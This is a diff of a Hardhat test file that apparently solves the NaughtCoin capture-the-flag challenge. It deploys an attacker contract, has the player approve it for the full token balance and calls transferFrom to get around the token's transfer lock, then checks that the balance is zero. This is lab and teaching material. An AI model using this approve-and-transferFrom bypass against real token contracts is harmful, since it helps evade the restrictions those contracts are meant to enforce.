@@ -3,20 +3,26 @@ import { ethers } from "hardhat";
 
 describe("NaughtCoin", async function () {
 
-  it("Should complete the function with no error", async function () {
-    const [signer] = await ethers.getSigners()
+  it("Should drain player's balance", async function () {
+    //setup+
+    const [deployer, player] = await ethers.getSigners()
     const NaughtCoin = await ethers.getContractFactory("NaughtCoin");
-    const naughtCoin = await NaughtCoin.deploy(signer.address);
+    const naughtCoin = await NaughtCoin.deploy(player.address);
     await naughtCoin.deployed();
+    //setup-
 
+    //1. Deploy attacker
     const NaughtCoinAttacker = await ethers.getContractFactory("NaughtCoinAttacker");
-    const naughtCoinAttacker = await NaughtCoinAttacker.deploy(naughtCoin.address);
-
+    const naughtCoinAttacker = await NaughtCoinAttacker.connect(player).deploy(naughtCoin.address);
     await naughtCoinAttacker.deployed();
-    expect(await naughtCoin.balanceOf(signer.address)).to.gt(0)
-    await naughtCoin.approve(naughtCoinAttacker.address, await naughtCoin.balanceOf(signer.address))
-    await naughtCoinAttacker.attack()
-    expect(await naughtCoin.balanceOf(signer.address)).to.eq(0)
+
+    expect(await naughtCoin.balanceOf(player.address)).to.gt(0)
+    //2. Approve balance
+    await naughtCoin.connect(player).approve(naughtCoinAttacker.address, await naughtCoin.balanceOf(player.address))
+    //3. Transfer using transferFrom balance
+    await naughtCoinAttacker.callTransferFrom()
+
+    expect(await naughtCoin.balanceOf(player.address)).to.eq(0)
   });
 
 });
